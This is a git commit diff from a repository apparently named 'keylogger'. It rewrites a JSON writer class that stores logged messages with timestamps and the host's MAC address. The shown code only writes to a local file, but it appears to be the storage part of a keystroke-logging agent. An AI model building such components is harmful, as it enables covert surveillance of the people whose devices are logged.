ae67708f60f5b7017a4cef13a64619b8149c0a9d
benjamin <2000beni770@gmail.com>
2025-02-20 13:36:15 +0200

    Merge branch 'main' of github.com:benjamin20000/keylogger

--- logger_agent/src/writer/json_log.py
+++ logger_agent/src/writer/json_log.py
@@ -1,20 +1,29 @@
 from interface.writer_interface import WriterInterface
 from datetime import datetime
+from getmac import get_mac_address as gma
 import json
+import os
+from config.config import json_path
 
 class JsonLog(WriterInterface):
+    def create_file(self):
+        with open(json_path, "w") as f:
+            data = {"mac_address": gma(),"data":[]}
+            json.dump(data, f, indent=2)
+        
     def write(self, message):
         new_data = {"time": datetime.now().strftime('%Y-%m-%d %H:%M'),
                     "data": message}
-        try:
-            with open("agent_data.json", "r") as f:
-                data = json.load(f) 
-        except (FileNotFoundError, json.JSONDecodeError):
-            data = []
-            
-        data.append(new_data)
-        with open("agent_data.json","w") as f:
-            json.dump(data, f, indent=2)
-
-
         
+        if not os.path.exists(json_path):
+            self.create_file()
+
+        try:
+            with open(json_path,"r+") as f:
+                current_json = json.load(f)
+                current_json["data"].append(new_data)
+                f.seek(0)
+                json.dump(current_json, f, indent=2)
+        except Exception as e:
+            print(e)
+
